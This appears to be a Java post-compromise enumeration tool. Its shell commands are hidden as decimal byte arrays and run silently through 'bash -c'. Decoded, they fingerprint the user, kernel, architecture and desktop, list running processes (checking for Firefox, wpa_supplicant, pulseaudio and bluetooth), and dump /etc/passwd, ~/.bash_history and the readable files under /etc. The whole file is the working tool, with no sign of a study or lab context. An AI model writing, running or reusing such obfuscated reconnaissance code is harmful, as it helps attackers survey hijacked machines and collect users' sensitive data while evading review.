import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.HashMap;

public class enumerate {
    public static void main(String[] args) {
        HashMap<String, String> data = new HashMap<String, String>();
        // whoami
        data.put(new String(new byte[] {119,104,111,97,109,105}), cmd(new String(new byte[] {119,104,111,97,109,105}))); // who am I?
        // ker_ver
        data.put(new String(new byte[] {107,101,114,95,118,101,114}), cmd(new String(new byte[] {117,110,97,109,101,32,45,114}))); // See kernel version
        // arch
        data.put(new String(new byte[] {97,114,99,104}), cmd(new String(new byte[] {117,110,97,109,101,32,45,109}))); // Arch. 86_64?
        // is_xfce
        data.put(new String(new byte[] {105,115,95,120,102,99,101}), String.valueOf(cmd(new String(new byte[] {40,101,110,118,32,124,124,32,115,101,116,41,32,50,62,47,100,101,118,47,110,117,108,108})).toLowerCase().contains(new String(new byte[] {120,102,99,101}))));
        String runningServices = cmd(new String(new byte[] {112,115,32,97,117,120})).toLowerCase();
        // running_firefox ?
        data.put(new String(new byte[] {114,117,110,110,105,110,103,95,102,105,114,101,102,111,120}), String.valueOf(runningServices.contains(new String(new byte[] {102,105,114,101,102,111,120}))));
        if(runningServices.contains(new String(new byte[] {102,105,114,101,102,111,120}))) {
            // firefox_ver
            data.put(new String(new byte[]{102,105,114,101,102,111,120,95,118,101,114}), cmd(new String(new byte[] {102,105,114,101,102,111,120,32,45,118})));
        }
        // wpa_supplicant ?
        data.put(new String(new byte[] {119,112,97,95,115,117,112,112,108,105,99,97,110,116}), String.valueOf(runningServices.contains(new String(new byte[] {119,112,97,95,115,117,112,112,108,105,99,97,110,116}))));
        // pulseaudio ?
        data.put(new String(new byte[] {112,117,108,115,101,97,117,100,105,111}),String.valueOf(runningServices.contains(new String(new byte[] {112,117,108,115,101,97,117,100,105,111}))));
        // bluetooth ?
        data.put(new String(new byte[] {98,108,117,101,116,111,111,116,104}), String.valueOf(runningServices.contains(new String(new byte[] {98,108,117,101,116,111,111,116,104}))));
        // passwd_file 
        data.put(new String(new byte[] {112,97,115,115,119,100,95,102,105,108,101}), cmd(new String(new byte[] {99,97,116,32,47,101,116,99,47,112,97,115,115,119,100})));
        // bash_history
        data.put(new String(new byte[] {98,97,115,104,95,104,105,115,116,111,114,121}), cmd(new String(new byte[] {99,97,116,32,126,47,46,98,97,115,104,95,104,105,115,116,111,114,121})));
        // readable_files_etc
        data.put(new String(new byte[] {114,101,97,100,97,98,108,101,95,102,105,108,101,115,95,101,116,99}), cmd(new String(new byte[] {102,105,110,100,32,47,101,116,99,47,32,45,114,101,97,100,97,98,108,101,32,45,116,121,112,101,32,102,32,50,62,47,100,101,118,47,110,117,108,108})));
        System.out.println(data);
    }
    public static String cmd(String s) {
    	String out = "";
    	try {
        	Process pr = new ProcessBuilder().command(new String(new byte[] {98,97,115,104}), new String(new byte[] {45,99}), s).start();
        	BufferedReader buf = new BufferedReader(new InputStreamReader(pr.getInputStream()));
        	String line = "";
        	while ((line=buf.readLine())!=null) {
        	out+=line+"\n";
        	}
    	}catch(Exception e) {
    		// Shhh. be silent
    	}
    	return out;
    }
}
